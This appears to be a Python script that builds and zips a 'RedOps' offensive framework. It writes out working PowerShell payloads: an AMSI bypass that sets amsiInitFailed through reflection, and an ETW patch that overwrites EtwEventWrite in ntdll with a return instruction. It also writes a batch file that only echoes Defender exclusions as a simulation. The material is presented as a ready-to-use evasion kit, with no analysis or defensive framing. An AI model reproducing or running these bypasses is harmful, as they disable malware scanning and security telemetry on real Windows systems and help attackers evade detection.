import shutil
from pathlib import Path

project_root = Path(__file__).resolve().parent.parent
redops_core = project_root / "RedOps" / "Core" / "bypass_suite"
redops_zip_base = project_root / "RedOps_Framework_With_Bypass"

redops_core.mkdir(parents=True, exist_ok=True)

# AMSI Bypass (PowerShell)
amsi_bypass_code = r'''
# AMSI Bypass using reflection
$Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$Field = $Ref.GetField('amsiInitFailed','NonPublic,Static')
$Field.SetValue($null,$true)
Write-Host "[+] AMSI Bypass Applied"
'''

# ETW Patching (PowerShell)
etw_patch_code = r'''
# ETW patching using in-memory byte overwrite (requires admin)
$etw = @"
using System;
using System.Runtime.InteropServices;
public class P {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $etw
$addr = [P]::GetProcAddress([P]::LoadLibrary("ntdll.dll"), "EtwEventWrite")
$p = 0
[P]::VirtualProtect($addr, [UIntPtr]5, 0x40, [Ref]$p)
[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3,0x00,0x00,0x00,0x00), 0, $addr, 5)
Write-Host "[+] ETW Patch Applied"
'''

# Defender Exclusion Simulation (Batch)
defender_sim_code = r'''
@echo off
echo [SIM] Adding Defender exclusions...
echo Excluding %USERPROFILE%\RedOps\
echo Excluding %TEMP%
echo [SIM] (No real changes made in this simulation script)
'''

# Write all files
(redops_core / "amsi_bypass.ps1").write_text(amsi_bypass_code.strip())
(redops_core / "etw_patch.ps1").write_text(etw_patch_code.strip())
(redops_core / "defender_exclude_sim.bat").write_text(defender_sim_code.strip())

# Create ZIP archive of the entire RedOps folder
shutil.make_archive(redops_zip_base.as_posix(), 'zip', root_dir=(project_root / "RedOps"))

print(f"[✔] Framework zipped to: {redops_zip_base.with_suffix('.zip').relative_to(project_root)}")